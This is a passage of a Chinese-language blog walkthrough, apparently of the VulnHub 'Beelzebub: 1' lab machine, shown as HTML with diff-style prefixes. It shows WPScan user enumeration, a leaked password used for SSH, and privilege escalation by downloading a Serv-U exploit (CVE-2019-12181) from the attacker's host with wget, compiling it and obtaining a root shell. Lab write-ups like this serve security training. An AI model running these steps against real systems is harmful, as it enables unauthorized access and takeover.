00:00:00 &lt;=========================================&gt; (100 / 100) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] Medias(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=38</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=39</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=42</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=44</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=48</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=49</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=51</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=74</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=75</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=77</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=99</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] http://192.168.56.244/d18e1e22becbd915b45e0e655429d487/?attachment_id=96</span></span><br><span class="line"><span class="string"> | Found By: Attachment Brute Forcing (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;===============================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] krampus</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] valak</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPScan API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Wed Nov 30 22:23:07 2022</span></span><br><span class="line"><span class="string">[+] Requests Done: 8400</span></span><br><span class="line"><span class="string">[+] Cached Requests: 9</span></span><br><span class="line"><span class="string">[+] Data Sent: 2.778 MB</span></span><br><span class="line"><span class="string">[+] Data Received: 1.289 MB</span></span><br><span class="line"><span class="string">[+] Memory used: 257.109 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:01:11</span></span><br></pre></td></tr></table></figure>
+
+<p>扫描出两个用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">krampus</span><br><span class="line">valak</span><br></pre></td></tr></table></figure>
+
+<p>接下来检查一下 <code>/wp-content/uploads/</code> 有无相关文件，发现了一个奇怪的目录 <code>/Talk_To_VALAK</code></p>
+<p>进入该目录，是另一个网站</p>
+<p><img src="https://pic1.imgdb.cn/item/6a2a27e0336be9166379b875.png"></p>
+<p>输入任意一个名字，返回的响应中含有密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">M4k3Ad3a1</span><br></pre></td></tr></table></figure>
+
+<p>直接登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Vulnhub/Beezlebub]</span><br><span class="line">└─$ ssh krampus@192.168.56.244</span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.56.244 (192.168.56.244)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:z1Xg/pSBrK8rLIMLyeb0L7CS1YL4g7BgCK95moiAYhQ.</span></span><br><span class="line"><span class="string">This key is not known by any other names</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.56.244<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">krampus@192.168.56.244&#x27;</span>s password: </span><br><span class="line">Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-53-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/advantage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> * Canonical Livepatch is available <span class="keyword">for</span> installation.</span><br><span class="line">   - Reduce system reboots and improve kernel security. Activate at:</span><br><span class="line">     https://ubuntu.com/livepatch</span><br><span class="line"></span><br><span class="line">294 packages can be updated.</span><br><span class="line">178 updates are security updates.</span><br><span class="line"></span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported <span class="keyword">until</span> April 2023.</span><br><span class="line">Last login: Sat Mar 20 00:38:04 2021 from 192.168.1.7</span><br><span class="line">krampus@beelzebub:~$ <span class="built_in">id</span></span><br><span class="line">uid=1000(krampus) gid=1000(krampus) <span class="built_in">groups</span>=1000(krampus),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">krampus@beelzebub:~$ </span><br></pre></td></tr></table></figure>
+
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="SolarWinds-Serv-U（CVE-2019-12181）"><a href="#SolarWinds-Serv-U（CVE-2019-12181）" class="headerlink" title="SolarWinds Serv-U（CVE-2019-12181）"></a>SolarWinds Serv-U（CVE-2019-12181）</h3><p>从 <code>.bash_history</code> 可以知道目标运行 servU，打 NDay 即可</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">krampus@beelzebub:~$ <span class="built_in">cd</span> /tmp</span><br><span class="line">krampus@beelzebub:/tmp$ wget http://192.168.56.206:8000/47009.c</span><br><span class="line">--2022-12-01 09:14:04--  http://192.168.56.206:8000/47009.c</span><br><span class="line">Connecting to 192.168.56.206:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 619 [text/x-csrc]</span><br><span class="line">Saving to: ‘47009.c’</span><br><span class="line"></span><br><span class="line">47009.c                         100%[=====================================================&gt;]     619  --.-KB/s    <span class="keyword">in</span> 0s      </span><br><span class="line"></span><br><span class="line">2022-12-01 09:14:04 (148 MB/s) - ‘47009.c’ saved [619/619]</span><br><span class="line"></span><br><span class="line">krampus@beelzebub:/tmp$ gcc -o exploit 47009.c </span><br><span class="line">krampus@beelzebub:/tmp$ ./exploit</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(krampus)</span><br><span class="line">opening root shell</span><br><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line"><span class="comment"># cat root.txt</span></span><br><span class="line">8955qpasq8qq807879p75e1rr24cr1a5</span><br></pre></td></tr></table></figure>
+    </div>
+    <footer class="article-footer">
+        <a class="article-category-link" href="/categories/VulnHub/" title="VulnHub" data-aos="zoom-in">VulnHub</a>
+
+      
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+    <div class="article-nav-link-wrap right">
+          <img data-src="/images/banner.webp" data-sizes="auto" alt="VulnHub Deathnote：1" class="lazyload">
+      <a href="/2026/06/10/Deathnote%201/" aria-label="后一篇: VulnHub Deathnote：1"  title="后一篇: VulnHub Deathnote：1"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+          VulnHub Deathnote：1
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        <span class="footer-info-sep rotate"></span>
+      ALL
+    </div>
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        126.4k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        10:35
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Beelzebub%EF%BC%9A1"><span class="toc-number">1.</span> <span class="toc-text">Beelzebub：1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">弱口令</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH"><span class="toc-number">1.1.1.</span> <span class="toc-text">SSH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SolarWinds-Serv-U%EF%BC%88CVE-2019-12181%EF%BC%89"><span class="toc-number">1.2.1.</span> <span class="toc-text">SolarWinds Serv-U（CVE-2019-12181）</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="ALL" class="lazyload">
+  <div class="sidebar-author-name">ALL</div>
+  <div class="sidebar-description">雾島风起時の日常</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">134</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">18</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">166</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-github sidebar-social-icon">
+      <a href=https://github.com/duckpigdog itemprop="url" target="_blank" aria-label="github" rel="noopener nofollow noreferrer"></a>
+    </div>
+    <div class="icon-bilibili sidebar-social-icon">
+      <a href=https://space.bilibili.com/1337537884?spm_id_from=333.1007.0.0 itemprop="url" target="_blank" aria-label="bilibili" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+          <div class="sidebar-menu-icon icon rotate">
+              &#xe62b;
+          </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "ALL",
+          title: "VulnHub Beelzebub：1",
+          url: "http://example.com/2026/06/10/Beelzebub%201/",
+          excerpt: "",
+          description: "",
+          stripContent: "Beelzebub：1博客地址：https://www.cnblogs.com/jason-huawen/p/16941009.html（该靶机网络连接很不稳定，懒得打了） 项目地址：https://download.vulnhub.com/beelzebub/Beelzebub.zip 是一个打包好的镜像文件 注意：导入 ova 时一定要选择我已移动，否则没网 使用 Nmap 扫描出开放服务及操作系统版本 1234567891011121314151617181920┌──(kali㉿kali",
+          date: "Wed Jun 10 2026 18:40:00 GMT+0800",
+          updated: "Thu Jun 11 2026 11:37:38 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.3' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+  </body>
+  </html>
